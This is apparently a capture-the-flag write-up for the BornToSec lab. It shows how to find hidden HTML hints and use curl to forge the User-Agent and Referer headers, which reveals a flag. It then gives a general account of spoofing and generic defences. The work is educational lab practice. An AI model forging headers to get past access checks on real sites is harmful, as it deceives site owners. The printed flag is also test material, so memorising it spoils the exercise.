# Spoofing

## How to exploit:
On the hom page, scroll all the way down and click on:
```bash
© BornToSec
```

This takes you to a strange page with some music playing. When inspecting the page to turn the music off we noticed strange things in the HTML.

```bash
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
```
And
```bash
<!--
Let us use this browser : "ft_bornToSec". It will help you a lot.
-->
```

Using these hints we can use curl to masquerade as a specific user agent (browser) and simulate navigation from a specific page.

```bash
curl -A 'ft_bornToSec' --referer "https://www.nsa.gov/" "0.0.0.0/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" | grep "flag"
```

### Explaining the flags:
* -A, --user-agent <name>
    (HTTP) Specify the User-Agent string to send to the  HTTP  server.  

    A user agent is software that acts on behalf of an end user, such as a browser that 'retrieves, renders and facilitates end user interaction with Web content'.
* -e, --referer <URL>
    (HTTP) Sends the "Referrer Page" information to the HTTP server.

    A referrer is a website that redirects visitors to your site, that is, the website a person was on before they navigated to your page.

Running the above command gives us this output:
```bash
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

## A brief explination of Spoofing:

A spoofing attack is a type of cyber attack where an intruder imitates another legitimate device or user to launch an attack against the network. In other words an attacker sends a communication from a device disguised as a legitimate device.

Spoofing attacks are a tricky entity because they can occur in so many different ways. From ARP spoofing to IP spoofing, MAC spoofing and DNS spoofing.

## How to protect against:

As a universal rule, the only way to be protected against spoofing attacks is to stay vigilant and implement company policies that include measures to detect and respond to spoofing attacks when they occur.

There are a range of steps you can implement to protect against spoofing attacks:

Packet Filtering: Packet filters inspect packets in transit. Packet filtering can help you to prevent IP address spoofing attacks because they block packets with incorrect source address information.
Deploy a spoof detection tool: Many vendors have produced spoof detection tools in an attempt to limit the spread of ARP spoofing attacks. These tools are designed to inspect data and block data which isn’t legitimate.
Use encrypted protocols – Encrypting data in transit can be a great way to prevent attackers from being able to view or interact with data. HTTP Secure (HTTPS), Transport Layer Security (TLS), and Secure Shell (SSH) are protocols that can all keep cyber attackers away.

## Resources:

* <https://www.comparitech.com/net-admin/spoofing-attacks-guide/>